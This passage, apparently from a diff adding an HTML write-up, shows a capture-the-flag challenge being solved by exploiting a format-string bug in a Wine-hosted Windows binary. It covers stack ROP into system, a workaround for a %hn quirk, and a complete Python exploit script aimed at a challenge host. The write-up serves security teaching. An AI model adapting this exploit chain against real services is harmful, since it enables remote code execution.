+                <code>system</code> at the Import Address Table (IAT) entry <code>0x140009448</code>. Since the program
+                passes the user buffer in <code>RCX</code> before calling <code>strcspn</code>, replacing it would
+                execute <code>system(buffer)</code>.
+            </p>
+            <p>However, writing to <code>0x140009448</code> caused a page fault on write access. The IAT was read-only
+                at runtime, forcing the exploit to target the writable stack.</p>
+        </section>
+
+        <!-- SELECTING STACK TARGET -->
+        <section id="selecting-stack-target">
+            <h2>Selecting the Stack Target</h2>
+            <p>The vulnerable call does not invoke UCRT directly. It calls a local MinGW <code>printf</code> wrapper at
+                <code>0x140002940</code>, which eventually returns through <code>0x140002992: ret</code>. At that point,
+                <code>RSP = 0x21ed38</code>. Therefore, the saved return address consumed by the wrapper's final
+                <code>ret</code> is stored at <code>0x21ed38</code>.
+            </p>
+            <p>The input buffer begins at <code>0x21ed60</code>. Both values remained stable between connections.</p>
+        </section>
+
+        <!-- INTENDED ROP CHAIN -->
+        <section id="intended-rop-chain">
+            <h2>Intended ROP Chain</h2>
+            <p>The final chain written at <code>0x21ed38</code> is:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Address</th>
+                        <th>Value</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>0x21ed38</code></td>
+                        <td><code>0x00000002c74a8c32</code></td>
+                        <td><code>pop rcx; ret</code> gadget</td>
+                    </tr>
+                    <tr>
+                        <td><code>0x21ed40</code></td>
+                        <td><code>0x000000000021f060</code></td>
+                        <td>Pointer to command string (buffer + 0x300)</td>
+                    </tr>
+                    <tr>
+                        <td><code>0x21ed48</code></td>
+                        <td><code>0x00000002c74a8c33</code></td>
+                        <td><code>ret</code> gadget (for 16-byte stack alignment)</td>
+                    </tr>
+                    <tr>
+                        <td><code>0x21ed50</code></td>
+                        <td><code>0x00000002c74c24b0</code></td>
+                        <td><code>ucrtbase!system</code> address</td>
+                    </tr>
+                    <tr>
+                        <td><code>0x21ed58</code></td>
+                        <td><code>0x0000000000000000</code></td>
+                        <td>Exit address (crashes, but after flag is printed)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- WINE HN QUIRK -->
+        <section id="wine-hn-quirk">
+            <h2>The Important Wine <code>%hn</code> Quirk</h2>
+            <p>Normally, <code>%hn</code> writes 2 bytes. However, in this Wine 8.0 UCRT implementation,
+                <code>%hn</code> behaved like a 32-bit write whose low 16 bits contained the intended count, spilling
+                zeroes into the next halfword. This broke our initial ROP attempt.
+            </p>
+
+            <h3>Compensating for the Spill</h3>
+            <p>The solution was to write the qwords as consecutive 16-bit chunks, ordered from low address to high
+                address: <code>A</code>, <code>A + 2</code>, <code>A + 4</code>, <code>A + 6</code>. Each
+                <code>%hn</code> write corrupted the next halfword, but the subsequent write immediately repaired it.
+                The final spill landed harmlessly beyond the ROP chain.
+            </p>
+        </section>
+
+        <!-- CONTROLLING PRINTED COUNT -->
+        <section id="controlling-printed-count">
+            <h2>Controlling the Printed Count</h2>
+            <p>Format string writes store the number of characters printed so far. To write a specific 16-bit value:</p>
+            <pre><code>padding = (value - (printed &amp; 0xFFFF)) &amp; 0xFFFF</code></pre>
+            <p>If padding is nonzero, the exploit appends <code>%[padding]c</code> (e.g. <code>%33970c</code>) to print
+                that many characters and advance the count, then appends <code>%hn</code> to write it.</p>
+        </section>
+
+        <!-- PLACING WRITE ADDRESSES -->
+        <section id="placing-write-addresses">
+            <h2>Placing Write Addresses</h2>
+            <p>Using the mapping <code>buffer_offset = (conversion - 4) * 8</code>, the exploit tracks which slot each
+                <code>%hn</code> uses, and inserts the target addresses into the payload at those computed offsets.
+            </p>
+        </section>
+
+        <!-- BUILDING PAYLOAD -->
+        <section id="building-payload">
+            <h2>Building and Understanding the Final Payload</h2>
+            <p>The final payload is structured as follows:</p>
+            <ol>
+                <li><strong>Active Format String:</strong> Generates character counts and executes writes. Starts with
+                    120 <code>%p</code> conversions (printing 1920 characters) to shift target pointer offsets far into
+                    the input, preventing NUL byte termination in the format string itself.</li>
+                <li><strong>Filler Bytes:</strong> Padding (using 'Q's).</li>
+                <li><strong>Command String:</strong> Embedded at buffer offset <code>0x300</code> (address
+                    <code>0x21f060</code>): <code>cmd.exe /c type flag.txt\x00</code>.
+                </li>
+                <li><strong>Destination Pointers:</strong> Embedded at the offsets calculated for the <code>%hn</code>
+                    conversions.</li>
+            </ol>
+        </section>
+
+        <!-- FINAL EXPLOIT -->
+        <section id="final-exploit">
+            <h2>Final Exploit</h2>
+            <p>The complete exploit script can be seen below:</p>
+            <pre><code>import struct
+import socket
+
+# Target offsets
+BUFFER = 0x21ed60
+WRAPPER_RETURN = 0x21ed38
+COMMAND_OFFSET = 0x300
+
+# Leaked Module Bases
+UCRTBASE = 0x2c7470000
+
+# Resolved remote addresses
+SYSTEM = UCRTBASE + 0x524b0
+POP_RCX_RET = UCRTBASE + 0x38c32
+RET = UCRTBASE + 0x38c33
+
+def build_payload(command: bytes) -> bytes:
+    command_address = BUFFER + COMMAND_OFFSET
+
+    chain = [
+        POP_RCX_RET,
+        command_address,
+        RET,
+        SYSTEM,
+        0,
+    ]
+
+    words = []
+    for qword_index, value in enumerate(chain):
+        address = WRAPPER_RETURN + qword_index * 8
+        for word_index in range(4):
+            word = (value &gt;&gt; (word_index * 16)) &amp; 0xFFFF
+            words.append((address + word_index * 2, word))
+
+    filler_count = 120
+    fmt = bytearray(b"%p" * filler_count)
+    conversion = filler_count
+    printed = filler_count * 16
+    placements = []
+
+    for address, value in words:
+        padding = (value - (printed &amp; 0xFFFF)) &amp; 0xFFFF
+        if padding:
+            fmt += f"%{padding}c".encode()
+            conversion += 1
+            printed += padding
+
+        fmt += b"%hn"
+        conversion += 1
+        placements.append(((conversion - 4) * 8, address))
+
+    payload_size = max(
+        max(offset + 8 for offset, _ in placements),
+        COMMAND_OFFSET + len(command) + 1,
+    )
+
+    payload = bytearray(b"Q" * payload_size)
+    payload[:len(fmt)] = fmt
+    payload[COMMAND_OFFSET:COMMAND_OFFSET + len(command)] = command
+    payload[COMMAND_OFFSET + len(command)] = 0
+
+    for offset, address in placements:
+        payload[offset:offset + 8] = struct.pack("&lt;Q", address)
+
+    return bytes(payload) + b"\n"
+
+def main():
+    host = "45.79.125.182"
+    port = 1339
+    
+    print("[*] Connecting to challenge service...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    
+    # Receive initial prompt
+    s.recv(1024)
+    
+    command = b"cmd.exe /c type flag.txt"
+    payload = build_payload(command)
+    
+    print("[*] Sending exploit payload...")
+    s.sendall(payload)
+    
+    # Receive output containing the flag
+    response = b""
+    s.settimeout(5.0)
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+    except socket.timeout:
+        pass
+        
+    print("[*] Extracting flag:")
+    for line in response.split(b"\n"):
+        if b"FLAG{" in line:
+            print(line.decode().strip())
+
+if __name__ == "__main__":
+    main()</code></pre>
+        </section>
+
+        <!-- RUNNING THE EXPLOIT -->
+        <section id="running-exploit">
+            <h2>Running the Exploit</h2>
+            <pre><code>python exploit.py</code></pre>
+            <p>Expected output:</p>
+            <pre><code>FLAG{b4by_w1n_g03s_brrrrrrrrr}</code></pre>
+        </section>
+
+        <!-- MANUAL DISCOVERY CHECKLIST -->
+        <section id="manual-discovery">
+            <h2>Manual Discovery Checklist</h2>
+            <ol>
+                <li><strong>Confirm format-string interpretation:</strong> Send <code>AAAA.%p.%p.%p.%p</code> and
+                    confirm hex output.</li>
+                <li><strong>Obtain the Wine debugger report:</strong> Reconnect and send <code>%s</code> to cause a
+                    crash. Log register values, stack addresses, and module bases.</li>
+                <li><strong>Map arguments to buffer offsets:</strong> Find the conversion slot offset mapping (e.g.
+                    conversion 4 maps to buffer offset 0).</li>
+                <li><strong>Verify controlled reading:</strong> Place a known pointer (like prompt
+                    <code>0x140004050</code>) at the mapped offset and leak it using <code>%s</code>.
+                </li>
+                <li><strong>Resolve remote functions:</strong> Use the Wine version from the report to download the
+                    exact remote DLL and calculate <code>system</code> base.</li>
+                <li><strong>Find a writable target:</strong> Identify the wrapper return address stack offset.</li>
+                <li><strong>Characterize %hn behavior:</strong> Determine how Wine handles the halfword writes (we
+                    discovered the 4-byte spill).</li>
+                <li><strong>Build ordered writes:</strong> Structure ROP chain halfwords from low-to-high addresses.
+                </li>
+                <li><strong>Execute:</strong> Run payload and get flag.</li>
+            </ol>
+        </section>
+
+        <!-- EXPLOITATION FLOW -->
+        <section id="exploitation-flow">
+            <h2>Exploitation Flow</h2>
+            <ol>
+                <li>Identify <code>printf(user_input)</code> in <code>main</code>.</li>
+                <li>Use <code>%p</code> to determine the conversion-to-buffer mapping.</li>
+                <li>Trigger <code>%s</code> crashes to obtain Wine debugger reports.</li>
+                <li>Recover fixed module and stack addresses from the reports.</li>
+                <li>Download the exact Wine 8.0 Debian DLL.</li>
+                <li>Resolve <code>system</code> and find a <code>pop rcx; ret</code> gadget.</li>
+                <li>Attempt an IAT overwrite and discover that the IAT is read-only.</li>
+                <li>Locate the local <code>printf</code> wrapper's saved return address.</li>
+                <li>Build a ROP chain that loads the command address into <code>RCX</code>.</li>
+                <li>Discover that Wine's <code>%hn</code> corrupts four bytes.</li>
+                <li>Repair that behavior with consecutive low-to-high halfword writes.</li>
+                <li>Return into <code>system("cmd.exe /c type flag.txt")</code>.</li>
+                <li>Read the flag from the socket.</li>
+            </ol>
+        </section>
+
+        <!-- KEY TAKEAWAYS -->
+        <section id="key-takeaways">
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li>Wine debugger output can turn crashes into powerful address disclosures.</li>
+                <li>Matching the exact remote DLL version matters when using export RVAs and ROP gadgets.</li>
+                <li>A correct target address is useless if the destination page is read-only.</li>
+                <li>Runtime behavior should be verified instead of assuming standard format string semantics.</li>
+                <li>Sequential argument accounting is essential when positional specifiers are unavailable.</li>
+                <li>The <code>%hn</code> spill looked fatal initially, but contiguous ordered writes made it
+                    deterministic and exploitable.</li>
+            </ul>
+        </section>
+    </div>
+</body>
+
+</html>
